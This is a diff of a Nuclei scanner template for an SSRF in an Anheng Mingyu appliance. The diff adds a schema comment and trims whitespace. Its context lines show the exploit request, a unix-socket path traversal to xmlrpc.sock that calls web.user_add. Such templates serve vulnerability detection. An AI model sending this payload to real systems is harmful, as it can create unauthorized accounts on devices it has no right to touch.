@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: anheng-mingyu-xmlrpc-sock-ssrf
 
 info:
@@ -16,7 +17,7 @@ http:
       - "{{BaseURL}}/service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc"
 
     body: |
-      <?xml version="1.0"?>  
+      <?xml version="1.0"?>
       <methodCall>
       <methodName>web.user_add</methodName>
       <params>
